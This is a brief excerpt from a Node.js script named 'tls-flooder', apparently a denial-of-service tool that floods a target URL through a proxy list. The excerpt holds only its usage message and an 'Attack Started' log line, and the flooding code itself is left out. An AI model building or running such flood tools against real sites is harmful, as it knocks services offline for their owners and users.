...
if (process.argv.length < 7){
    console.log(`Usage: node tls-flooder <url> <time> <threads> <reqs> <proxyfile> <GET/PRI> | MADE BY @aTunChoiNgu\nExample: node tls-flooder.js https://example.com 120 10 64 proxy.txt GET`)
    process.exit(1)
}
...
if (cluster.isMaster){
	console.log('Attack Started !!! | tls-flooder MADE BY [@TunChoiNgu]');
